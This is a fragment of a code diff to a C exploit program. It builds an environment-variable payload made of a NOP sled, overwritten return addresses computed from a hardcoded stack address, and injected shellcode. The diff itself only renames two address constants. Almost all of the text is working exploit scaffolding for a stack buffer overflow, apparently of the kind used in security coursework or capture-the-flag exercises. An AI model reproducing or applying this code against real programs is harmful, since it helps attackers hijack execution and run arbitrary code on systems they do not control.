@@ -11,14 +11,14 @@ const uint32_t BASE_ADDR = 0xffffdec0;
 const int NOP_SIZE = 201;
 const char NOP_CHAR = 0x90;
 const int RET_OFFSET = 4;
-const uint32_t START_ADDR = BASE_ADDR + RET_OFFSET;
-const uint32_t SECOND_ADDR = BASE_ADDR + 2 * RET_OFFSET;
+const uint32_t A1 = BASE_ADDR + RET_OFFSET;
+const uint32_t A2 = BASE_ADDR + 2 * RET_OFFSET;
 const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
 
 void prepEnv(char *e) {
     memset(e, NOP_CHAR, ENV_SIZE - 1);
-    *((uint32_t *)(e)) = START_ADDR;
-    *((uint32_t *)(e + RET_OFFSET)) = SECOND_ADDR;
+    *((uint32_t *)(e)) = A1;
+    *((uint32_t *)(e + RET_OFFSET)) = A2;
     memcpy(e + NOP_SIZE, shellcode, sizeof(shellcode));
     e[ENV_SIZE - 1] = '\0';
 }
